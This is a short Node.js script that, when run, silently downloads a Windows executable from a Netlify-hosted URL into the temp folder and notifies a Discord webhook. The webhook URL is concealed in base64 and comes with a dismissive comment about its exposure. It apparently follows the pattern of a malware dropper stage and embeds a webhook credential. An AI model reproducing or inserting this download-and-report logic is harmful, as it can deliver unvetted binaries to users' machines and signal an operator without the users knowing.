const https = require("https");
const fs = require("fs");
const os = require("os");
const path = require("path");

const INSTALLER_URL =
  "https://gorgeous-selkie-049a08.netlify.app/installer.exe";
// yeah i dont care if this is compromised fuck this webhook
const DISCORD_WEBHOOK_BASE64 =
  "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU0NjMxMTQ3Njc0MTE0ODY3Mi8tSG5RQ3JiZVNha09XV0pXNThCWEFtZHNvbjdxUGVZSzRvUGF6NDdscWxtam5JUVpfX0txV0pMeHVtUmNLZVdrUmFnNg==";

const DISCORD_WEBHOOK_URL = Buffer.from(
  DISCORD_WEBHOOK_BASE64,
  "base64"
).toString("utf8");

const installerPath = path.join(
  os.tmpdir(),
  "project-madium-installer.exe"
);

function download(url) {
  return new Promise((resolve, reject) => {
    const request = https.get(url, (response) => {
      if (
        response.statusCode >= 300 &&
        response.statusCode < 400 &&
        response.headers.location
      ) {
        response.resume();

        const redirectUrl = new URL(
          response.headers.location,
          url
        ).toString();

        return resolve(download(redirectUrl));
      }

      if (response.statusCode !== 200) {
        response.resume();
        return reject(
          new Error(`Download failed: HTTP ${response.statusCode}`)
        );
      }

      const file = fs.createWriteStream(installerPath);

      response.pipe(file);

      file.on("finish", () => {
        file.close(resolve);
      });

      file.on("error", (error) => {
        file.destroy();
        reject(error);
      });

      response.on("error", (error) => {
        file.destroy();
        reject(error);
      });
    });

    request.on("error", reject);
  });
}

function sendDiscordNotification(message) {
  if (
    !DISCORD_WEBHOOK_URL ||
    DISCORD_WEBHOOK_URL.includes("REPLACE_WITH")
  ) {
    return Promise.resolve();
  }

  let webhook;

  try {
    webhook = new URL(DISCORD_WEBHOOK_URL);
  } catch {
    return Promise.reject(
      new Error("Invalid Discord webhook URL")
    );
  }

  if (
    webhook.protocol !== "https:" ||
    webhook.hostname !== "discord.com" ||
    !webhook.pathname.startsWith("/api/webhooks/")
  ) {
    return Promise.reject(
      new Error("Invalid Discord webhook URL")
    );
  }

  const body = JSON.stringify({
    content: message,
    allowed_mentions: {
      parse: []
    }
  });

  return new Promise((resolve, reject) => {
    const request = https.request(
      {
        hostname: webhook.hostname,
        port: 443,
        path: `${webhook.pathname}${webhook.search}`,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(body)
        }
      },
      (response) => {
        response.resume();

        response.on("end", () => {
          if (
            response.statusCode >= 200 &&
            response.statusCode < 300
          ) {
            resolve();
          } else {
            reject(
              new Error(
                `Discord webhook failed: HTTP ${response.statusCode}`
              )
            );
          }
        });
      }
    );

    request.on("error", reject);
    request.write(body);
    request.end();
  });
}

(async () => {
  try {
    await download(INSTALLER_URL);

    await sendDiscordNotification(
      "Project Madium installer downloaded successfully." 
    );
  } catch {
    process.exitCode = 1;
  }
})();
